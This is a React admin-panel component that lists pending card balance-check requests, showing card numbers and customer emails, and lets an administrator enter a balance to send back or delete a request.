import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';
import { TrashIcon } from '@heroicons/react/24/outline';

function BalanceRequestsStream() {
    const [requests, setRequests] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [balanceInputs, setBalanceInputs] = useState({});
    const [deletingId, setDeletingId] = useState(null);
    const [successMessage, setSuccessMessage] = useState(null);

    const fetchRequests = async () => {
        try {
            const token = localStorage.getItem('adminToken');
            const response = await axios.get('/api/admin/balance-requests', {
                headers: { Authorization: `Bearer ${token}` }
            });
            setRequests(response.data);
            setError(null);
        } catch (error) {
            setError('Failed to fetch balance requests');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchRequests();
        const interval = setInterval(fetchRequests, 30000);
        return () => clearInterval(interval);
    }, []);

    const handleBalanceSubmit = async (requestId) => {
        try {
            const balance = balanceInputs[requestId];
            if (!balance) return;

            const token = localStorage.getItem('adminToken');
            const response = await axios.post(
                `/api/admin/balance-requests/${requestId}/complete`, 
                { balance },
                { headers: { Authorization: `Bearer ${token}` } }
            );

            // Show success message
            setSuccessMessage('Balance updated and email sent successfully');
            setTimeout(() => setSuccessMessage(null), 5000); // Clear after 5 seconds

            // Remove the completed request and clear input
            setRequests(requests.filter(req => req._id !== requestId));
            setBalanceInputs(prev => {
                const newInputs = { ...prev };
                delete newInputs[requestId];
                return newInputs;
            });
        } catch (error) {
            setError('Failed to submit balance');
        }
    };

    const handleDelete = async (requestId) => {
        try {
            setDeletingId(requestId);
            const token = localStorage.getItem('adminToken');
            await axios.delete(`/api/admin/balance-requests/${requestId}`, {
                headers: { Authorization: `Bearer ${token}` }
            });
            setRequests(requests.filter(req => req._id !== requestId));
        } catch (error) {
            setError('Failed to delete request');
        } finally {
            setDeletingId(null);
        }
    };

    if (loading) {
        return (
            <div className="bg-white rounded-lg shadow-lg p-6">
                <div className="flex items-center justify-center py-8">
                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                    <span className="ml-3 text-gray-600">Loading balance requests...</span>
                </div>
            </div>
        );
    }

    return (
        <div className="bg-white rounded-lg shadow-lg p-6">
            <div className="flex justify-between items-center mb-6">
                <h3 className="text-lg font-semibold text-gray-900">Balance Requests Stream</h3>
                <span className="bg-blue-100 text-blue-800 text-xs font-medium px-2.5 py-0.5 rounded-full">
                    {requests.length} Pending
                </span>
            </div>
            
            {successMessage && (
                <div className="bg-green-50 text-green-600 p-4 rounded-md mb-6 flex items-center">
                    <svg className="h-5 w-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                    </svg>
                    {successMessage}
                </div>
            )}

            {error && (
                <div className="bg-red-50 text-red-600 p-4 rounded-md mb-6 flex items-center">
                    <svg className="h-5 w-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                    </svg>
                    {error}
                </div>
            )}

            <div className="space-y-4">
                <AnimatePresence>
                    {requests.length === 0 ? (
                        <div className="text-center py-12 bg-gray-50 rounded-lg">
                            <svg className="mx-auto h-12 w-12 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
                            </svg>
                            <h3 className="mt-2 text-sm font-medium text-gray-900">No pending requests</h3>
                            <p className="mt-1 text-sm text-gray-500">New balance check requests will appear here</p>
                        </div>
                    ) : (
                        requests.map(request => (
                            <motion.div
                                key={request._id}
                                initial={{ opacity: 0, y: 20 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, x: -100 }}
                                className="border rounded-lg p-5 bg-gray-50 hover:bg-gray-100 transition-colors duration-200"
                            >
                                <div className="flex justify-between items-start mb-4">
                                    <div>
                                        <p className="font-medium text-gray-900">
                                            Card: <span className="font-mono">{request.cardNumber}</span>
                                        </p>
                                        <p className="text-sm text-gray-600 mt-1">
                                            Email: {request.customerEmail}
                                        </p>
                                        <p className="text-xs text-gray-500 mt-1">
                                            Requested: {new Date(request.requestedAt).toLocaleString()}
                                        </p>
                                    </div>
                                    <div className="flex items-center space-x-2">
                                        <span className="px-2.5 py-1 bg-yellow-100 text-yellow-800 text-sm rounded-full">
                                            Pending
                                        </span>
                                        <button
                                            onClick={() => handleDelete(request._id)}
                                            disabled={deletingId === request._id}
                                            className="p-1 text-gray-500 hover:text-red-600 transition-colors duration-200"
                                        >
                                            <TrashIcon className="h-5 w-5" />
                                        </button>
                                    </div>
                                </div>
                                
                                <div className="flex gap-3 mt-4">
                                    <div className="relative flex-1">
                                        <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                            <span className="text-gray-500 sm:text-sm">$</span>
                                        </div>
                                        <input
                                            type="number"
                                            value={balanceInputs[request._id] || ''}
                                            onChange={(e) => setBalanceInputs(prev => ({
                                                ...prev,
                                                [request._id]: e.target.value
                                            }))}
                                            placeholder="Enter balance amount"
                                            className="block w-full pl-7 pr-12 py-2.5 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                                        />
                                        <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                                            <span className="text-gray-500 sm:text-sm">USD</span>
                                        </div>
                                    </div>
                                    <button
                                        onClick={() => handleBalanceSubmit(request._id)}
                                        className="px-6 py-2.5 bg-green-600 text-white rounded-lg hover:bg-green-700 focus:ring-4 focus:ring-green-300 transition-colors duration-200"
                                    >
                                        Send Balance
                                    </button>
                                </div>
                            </motion.div>
                        ))
                    )}
                </AnimatePresence>
            </div>
        </div>
    );
}

export default BalanceRequestsStream; 